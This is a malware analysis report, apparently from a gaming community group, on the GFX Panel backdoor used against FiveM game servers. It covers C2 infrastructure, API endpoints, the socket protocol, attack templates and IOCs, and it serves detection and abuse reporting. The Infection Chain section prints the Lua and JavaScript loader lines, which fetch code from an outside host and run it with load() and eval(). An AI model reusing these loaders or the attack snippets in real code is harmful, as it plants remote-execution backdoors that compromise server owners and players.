# GFX Panel — Second Product by the Blum Panel Attacker

> **Bonus analysis from the Blum Panel investigation.**
> GFX Panel is a separate FiveM backdoor product built by the same attacker,
> discovered during infrastructure mapping of the Blum Panel network.
> Unlike Blum, GFX Panel has **no Cloudflare protection** — the origin server is fully exposed.

---

## Discovery

While mapping Blum Panel's infrastructure, JGN identified three direct IP servers at UAB Esnet in Vilnius, Lithuania. One of them — `185.80.130.168` — was running a completely separate FiveM panel called **GFX Panel** on exposed ports with no CDN protection.

The server responds to Socket.IO connections with any Host header, including `blum-panel.me` and `fivems.lt`, confirming it sits within the same operator's infrastructure.

---

## Infrastructure (Fully Exposed)

| Item | Value |
|------|-------|
| IP Address | 185.80.130.168 (**NO CLOUDFLARE** — direct access) |
| Domains | gfxpanel.org, kutingplays.com |
| Registrar | Namecheap |
| Created | February 7, 2026 |
| Backend Path | `/root/local/gfx/backend/` (leaked via Express.js stack trace) |
| Backend | Express.js + body-parser + raw-body on Node.js |
| Port 80 | Apache/2.4.52 (serves React SPA) |
| Port 3000 | Express.js API + Socket.IO (raw, no proxy) |
| Port 22 | OpenSSH_8.9p1 Ubuntu |
| Hosting | UAB Esnet (VPSNET-COM), Vilnius, Lithuania |
| Discord | discord.gg/cwd5kHwq6v (dead) |
| Built With | GPT Engineer (project: `eSi92A9tMBTQWYu6OPvMFhyFiy72`) |

The backend path was obtained by sending malformed JSON to any POST endpoint — Express.js is running in **development mode** with full stack traces enabled:

```
at parse (/root/local/gfx/backend/node_modules/body-parser/lib/types/json.js:92:19)
at /root/local/gfx/backend/node_modules/body-parser/lib/read.js:128:18
```

---

## Connection to Blum Panel

GFX Panel is **not a fork of Blum**. It was built from scratch using GPT Engineer. However, it is operated by the same attacker:

| Evidence | Detail |
|----------|--------|
| Same datacenter | Blum file server at 185.80.128.35, GFX at 185.80.130.168 — both UAB Esnet, Vilnius |
| Same registrar | Both 9ns1.com (Blum) and gfxpanel.org use Namecheap |
| Same payload pattern | Both use `/${endpoint}` for Lua and `/${endpoint}jj` suffix for JavaScript payloads |
| Socket.IO cross-response | 185.80.130.168 responds to Socket.IO for Host headers `blum-panel.me` and `fivems.lt` |
| Timeline | GFX created Feb 7, 2026 — during Blum's active operation period |

---

## How GFX Differs from Blum

| Feature | Blum Panel | GFX Panel |
|---------|-----------|-----------|
| Origin | Stolen Cipher Panel code | Built from scratch (GPT Engineer) |
| Frontend size | 1.97 MB | 749 KB |
| Authentication | Discord ID whitelist (hardcoded) | Discord OAuth + JWT tokens |
| Socket.IO events | 75+ | ~20 |
| Infection method | Self-replicating worm (auto-spreads) | Manual autoloader (user injects ZIPs) |
| Player manipulation | 12+ actions | 10 actions |
| txAdmin exploitation | Yes (credential theft, admin creation) | No |
| WebRTC screen capture | Yes (live player screen viewing) | No |
| Linux privilege escalation | No | Yes (sudo user management) |
| Subscription model | Crypto payments, no approval | Trial/Monthly/Lifetime with admin approval |
| Anti-debug | None | DevTools detection + infinite debugger loop |
| Crypto wallets | 5 wallets in frontend | None in frontend |
| CDN protection | Cloudflare on all domains | None — bare metal |

GFX is a **simpler, cleaner product** — fewer features but more structured user management with an approval workflow.

---

## API Surface (37 Endpoints)

Full endpoint map with request/response details is in `evidence/GFX_PANEL_DEOBFUSCATED.js`.

### Public Endpoints (No Authentication)

| Method | Path | Response |
|--------|------|----------|
| GET | /heartbeat | 63,426 bytes — Luraph-obfuscated Lua payload |
| GET | /register | 60,769 bytes — Luraph-obfuscated Lua payload |
| GET | /test | 62,860 bytes — Luraph-obfuscated Lua payload |
| GET | /:endpoint | Per-user Lua payload (browser visitors redirected to cfx.re) |
| GET | /:endpointjj | Per-user JavaScript payload |
| POST | /sendWebhooks | Discord webhook relay (rate limited) |

### Authenticated Endpoints (JWT Required)

| Method | Path | Purpose |
|--------|------|---------|
| GET | /auth/me | Session check |
| GET | /auth/callback | Discord OAuth return |
| GET | /servers | List connected servers |
| GET | /servers/:id/console | Console output |
| GET | /servers/:id/players | Player list |
| GET | /servers/:id/resources | Resource list |
| POST | /execute-script | Execute code on server |
| POST | /api/inject-resource | Upload ZIP, inject backdoor, return weaponized ZIP |

### Admin Endpoints

| Method | Path | Purpose |
|--------|------|---------|
| GET | /admin/users | List all users |
| GET | /admin/scripts | System payload library |
| POST | /admin/scripts | Create system payload |
| PUT | /admin/users/:id/approve | Approve user + assign endpoint |
| PUT | /admin/users/:id/subscription | Set tier (Free/Trial/Monthly/Lifetime) |
| PUT | /admin/users/:id/suspend | Suspend account |
| DELETE | /admin/users/:id | Delete user (transfers servers to admin) |

---

## Infection Chain

GFX Panel uses a **manual injection model** rather than Blum's self-replicating worm:

```
 STEP 1: AUTOLOADER (Resource Injection Tool)

  Customer uploads clean FiveM resource (.zip) to panel
  Selects injection type: "server" | "client" | "both"
  Panel POSTs to http://185.80.130.168:3000/api/inject-resource
  Backend injects loader code into resource files + modifies fxmanifest.lua
  Returns weaponized ZIP: "${name}_injected.zip"
  Customer distributes infected resource to victims

 STEP 2: LOADER (Injected into victim resource)

  Lua variant:
    PerformHttpRequest('https://gfxpanel.org/${endpoint}', function(e, d)
        pcall(function() assert(load(d))() end)
    end)

  JavaScript variant (endpoint + "jj" suffix):
    https.get('https://gfxpanel.org/${endpoint}jj', r => {
        let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d));
    });

 STEP 3: PERSISTENT BACKDOOR (Socket.IO to 185.80.130.168:3000)

  Code execution (Lua server, Lua client, Lua both, JavaScript)
  Console access (real-time streaming)
  Player manipulation (kick, kill, heal, explode, ragdoll, freeze, vehicles)
  Resource theft (ZIP download of any server resource)
  Server lockdown (kick all + block connections)
```

---

## Socket.IO Protocol

Authentication: `{type: "dashboard", token: "<JWT from localStorage>"}`

### Panel to Backend (emit)

| Event | Payload |
|-------|---------|
| execute | `{ server_id, code, execution_type, script_id?, args? }` |
| console:list | `{ serverId }` |
| resources:list | `{ serverId }` |
| resource:download | `{ serverId, resourceName }` |
| server:get | `{ serverId }` |
| servers:list | User's servers |
| servers:list:all | All servers (admin only) |
| watch:server | Subscribe to server events |
| unwatch:server | Unsubscribe |

### Backend to Panel (on)

| Event | Content |
|-------|---------|
| execute:result | Code execution output |
| console:log | Real-time console line |
| console:logs | Console history batch |
| resource:download | Base64 ZIP of stolen resource |
| resources:changed | Resource list update |
| server:status | Online/offline status |
| servers:update | Server list update |
| server:removed | Server disconnected |

---

## Pre-Built Attack Templates

Extracted from the frontend bundle — these are the one-click attack options available to customers:

| Action | Code |
|--------|------|
| Kick | `DropPlayer(id, reason)` |
| Fake Ban | `DropPlayer(id, "^1[BANNED]^0 message")` |
| Kill | `SetEntityHealth(GetPlayerPed(id), 0)` |
| Heal/Revive | `SetEntityHealth(ped, 200)` + `ResurrectPed(ped)` |
| Launch (50m up) | `SetEntityCoords(ped, x, y, z+50.0)` |
| Explode | `AddExplosion(coords, 1, 10.0)` |
| Ragdoll | `SetPedToRagdoll(ped, 5000, 5000, 0)` |
| Freeze | `FreezeEntityPosition(ped, toggle)` |
| Spawn Vehicle | `CreateVehicle(model)` + `TaskWarpPedIntoVehicle` |
| Set Job (ESX) | `TriggerEvent('esx:setJob', id, job, grade)` |
| Announcement | `TriggerClientEvent('txcl:showAnnouncement', -1, msg)` |
| Lockdown | Kick all + block `playerConnecting` with deferrals |

---

## Linux Privilege Escalation

The GFX Panel owner panel includes Linux user management — a feature Blum Panel does not have:

| Action | Description |
|--------|-------------|
| Create User | Creates a Linux system user with optional sudo privileges |
| Change Password | Resets an existing user's password |
| Add Sudo | Adds user to sudoers/sudo group — full admin access |

Warning displayed: *"Sudo accounts have full control. Only create for trusted individuals."*

---

## Anti-Debug Measures

GFX Panel implements three layers of anti-debug protection (Blum has none):

1. **Right-click disabled** — `contextmenu` event prevented
2. **DevTools shortcuts blocked** — F12, Ctrl+Shift+I/J/C, Ctrl+U all intercepted
3. **Debugger detection loop** — Uses `performance.now()` timing around `debugger` statement. If >100ms delay detected (indicating DevTools is open), enters infinite `while(true) { debugger; }` trap

---

## Lua Payload Encryption

Three Luraph-obfuscated payloads are served publicly with no authentication. Each uses a triple-layer encryption scheme:

1. XOR numeric arrays with rotating string key
2. Shuffle via index remapping array
3. XOR again with second rotating key
4. `table.concat()` result and feed to `load()`

Decoded encryption keys were extracted but the final output requires an additional runtime key provided by the backend when serving user-specific endpoints. The public `/heartbeat`, `/register`, and `/test` endpoints serve the encrypted templates that get customized per-user at delivery time.

---

## User Management

| Tier | Description |
|------|-------------|
| Free | Basic access |
| Trial | Time-limited evaluation |
| Monthly | Paid subscription |
| Lifetime | Permanent access |

| Role | Access |
|------|--------|
| user | Own servers only |
| admin | Can manage users, see all servers |
| owner | Full system access including Linux management |

Workflow: Register via Discord OAuth → pending approval → admin assigns endpoint path → user receives payload URL → distribute to victims.

---

## Detection

### Network IOCs

| Type | Value |
|------|-------|
| C2 IP | 185.80.130.168 |
| C2 Port | 3000 (Socket.IO) |
| Domains | gfxpanel.org, kutingplays.com |
| Payload URLs | /heartbeat, /register, /test, /:endpoint, /:endpointjj |
| Injection API | http://185.80.130.168:3000/api/inject-resource |

### String Signatures

```
gfxpanel.org
kutingplays.com
"Gfx Panel - Join Discord gfxpanel.org/discord"
"gfxpanel.org/discord"
*_injected.zip
PerformHttpRequest to gfxpanel.org or kutingplays.com
```

### File Indicators

Luraph payloads with 140+ numeric arrays, double XOR decryption, rotating string keys, index shuffle, and `load(table.concat(...))` execution pattern.

---

## Evidence Files

| File | Description |
|------|-------------|
| `evidence/GFX_PANEL_DEOBFUSCATED.js` | Complete GFX Panel analysis — all 37 API endpoints, socket protocol, attack templates, encryption analysis, IOCs |
| `evidence/gfx_panel.html` | GFX Panel HTML source with anti-debug code |

---

## Reporting

| Target | Contact | Report |
|--------|---------|--------|
| Cfx.re | FiveM Team | GFX Panel analysis + payload samples |
| UAB Esnet | abuse@vpsnet.lt | 185.80.130.168 — exposed C2 server |
| Namecheap | abuse@namecheap.com | gfxpanel.org — malware C2 domain |

---

<p align="center">
  <strong>Research by Justice Gaming Network (JGN)</strong><br>
  <a href="https://discord.gg/JRP">discord.gg/JRP</a><br><br>
  GFX Panel analysis conducted March 14, 2026.<br>
  Infrastructure remains active and fully exposed.
</p>
